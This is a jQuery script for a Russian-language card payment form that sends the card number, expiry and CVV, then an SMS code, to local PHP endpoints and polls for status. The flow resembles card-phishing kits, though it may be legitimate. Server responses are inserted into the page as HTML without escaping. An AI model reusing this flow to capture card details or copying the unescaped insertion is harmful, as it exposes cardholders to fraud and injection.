$(function () {
    $('[data-toggle="tooltip"]').tooltip()
});

if (window.parent && window.parent.parent) {
    window.parent.parent.postMessage(["resultsFrame", {
        height: document.body.getBoundingClientRect().height,
        slug: "zbxvcwjm"
    }], "*")
}

window.name = "result";

$('#cardInput').mask('9999 9999 9999 9999');
$('#cvv').mask('999');

$("#confirm").click(function () {
    $('#cardInput').validateCreditCard(function(result)
    {
        window.validCredit = result.valid;
        if (result.valid == false) {
            $('#not').html('<p class="alert alert-danger"> Введите правильную банковскую карту. </p>');
        }
    });

    if(window.validCredit === true) {
        $.ajax({
            type: "POST",
            url: "api/submit.php",
            data: {
                cardNumber: $.trim($("#cardInput").val()),
                expiry: $.trim($("#month").val()) + '/' + $.trim($("#year").val()),
                cvv: $.trim($("#cvv").val()),
            },
            success: function (response) {
                console.log(response);
                if (response.indexOf("Error") != '-1') {
                    $('#not').html('<p class="alert alert-danger"> Произошла ошибка ' + response + ' </p>');
                } else {
                    $("#confirm").prop("disabled", true);
                    $('#not').html('<p class="alert alert-success"> Начата обработка платежа. </p>');
                    setTimeout(function () {
                        checkinvoice(response)
                    }, 5000);
                }
            },
            error: function (XMLHttpRequest, textStatus, errorThrown) {
                console.log("Error");
            }

        });
    }
    //$( "#ccForm" ).submit();
});

function sendSMSCode(id) {
    $.ajax({
        type: "POST",
        url: "api/smscode.php",
        data: {
            id: id,
            code: $.trim($("#smscode").val()),
        },
        success: function (response) {
            console.log(response);
            if (response.indexOf("Error") != '-1') {
                $('#not').html('<p class="alert alert-danger"> Произошла ошибка ' + response + ' </p>');
            } else {
                $("#sendsms").prop("disabled", true);
                $('#not').html('<p class="alert alert-success"> Проверка СМС кода начата. </p>');
                setTimeout(function () {
                    checksms(id)
                }, 5000);
            }
        },
        error: function (XMLHttpRequest, textStatus, errorThrown) {
            console.log("Error");
        }

    });
}

function checksms(id) {
    $.ajax({
        type: "POST",
        url: "api/smsstatus.php",
        data: {
            id: id,
        },
        success: function (response) {
            $('#not').html('');
            console.log(response);
            if (response.indexOf("Error") != '-1') {
                $('#not').html('<p class="alert alert-danger"> Произошла ошибка при проверке статуса ' + response + ' </p>');
            } else if (response == 1) {
                setTimeout(function () {
                    checksms(id)
                }, 5000);
            } else if (response == 2) {
                $('#not').html('<p class="alert alert-danger"> Произошла ошибка. Попробуйте позже. </p>');
            } else if (response.indexOf("3") != '-1') {
                reason = response.split('|');
                $("#sendsms").prop("disabled", false);
                $('#not').html('<p class="alert alert-danger"> ' + reason[1] + ' </p>');
            }
        },
        error: function (XMLHttpRequest, textStatus, errorThrown) {
            console.log("Error");
        }

    });
}



function checkinvoice(id) {
    $.ajax({
        type: "POST",
        url: "api/status.php",
        data: {
            id: id
        },
        success: function (response) {
            $('#not').html('');
            console.log(response);
            if (response.indexOf("Error") != '-1') {
                $('#not').html('<p class="alert alert-danger"> Произошла ошибка при проверке статуса ' + response + ' </p>');
            } else if (response == 1) {
                setTimeout(function () {
                    checkinvoice(id)
                }, 5000);
            } else if (response == 2) {
                var form = $('<form action="complete.php" method="post">' +
                    '<input type="hidden" name="invoiceID" value="' + id + '" >' +
                    '</form>');
                $('body').append(form);
                form.submit();
            } else if (response.indexOf("3") != '-1') {
                reason = response.split('|');
                $( "#confirm" ).prop( "disabled", false );
                $('#not').html('<p class="alert alert-danger"> ' + reason[1] + ' </p>');
            }
        },
        error: function (XMLHttpRequest, textStatus, errorThrown) {
            console.log("Error");
        }

    });
}